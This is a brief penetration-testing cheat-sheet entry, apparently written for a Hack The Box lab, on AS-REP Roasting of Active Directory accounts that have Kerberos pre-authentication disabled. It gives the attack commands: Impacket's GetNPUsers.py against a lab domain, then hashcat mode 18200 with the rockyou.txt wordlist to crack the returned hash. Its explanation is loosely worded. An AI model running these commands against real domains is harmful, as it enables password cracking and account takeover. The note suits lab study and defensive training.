# AS-REP Roasting

## Introduction

<mark style="color:red;">AS-REPRoasting</mark> means that <mark style="background-color:yellow;">Kerberos Pre-Authentication is disabled on that user</mark>. You will also receive a TGT hash that can then be cracked. This can be accomplished with the script below.

* Check with the following command:

```python
Get-NPUsers.py LICORDEBELLOTA.HTB/Kaorz -dc-ip <IP> -no-pass

# You will get a TGT hash. Save the hash in a file and crack the hash

hashcat -m 18200 hash rockyou.txt
```
